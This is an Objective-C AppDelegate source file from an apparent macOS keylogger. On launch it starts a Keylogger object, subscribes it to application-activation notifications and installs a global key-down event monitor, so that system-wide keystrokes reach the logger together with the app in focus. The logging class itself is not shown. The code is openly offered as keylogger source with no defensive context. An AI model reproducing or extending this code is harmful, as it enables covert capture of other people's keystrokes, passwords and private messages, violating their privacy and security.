
#import "AppDelegate.h"

@implementation AppDelegate

- (void)applicationDidFinishLaunching:(NSNotification *)aNotification
{
    keylogger = [[Keylogger alloc] init];
    
    //Notifications for active applications
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:keylogger
                                                           selector:@selector(appDidActivate:)
                                                               name:NSWorkspaceDidActivateApplicationNotification
                                                             object:nil];
    
    //Notifications for key presses
    [NSEvent addGlobalMonitorForEventsMatchingMask:NSKeyDownMask
                                           handler:^ (NSEvent *event) {[keylogger handleKeyPress:event];}];

}

- (void)dealloc {
    [[[NSWorkspace sharedWorkspace] notificationCenter] removeObserver:keylogger];
}

@end
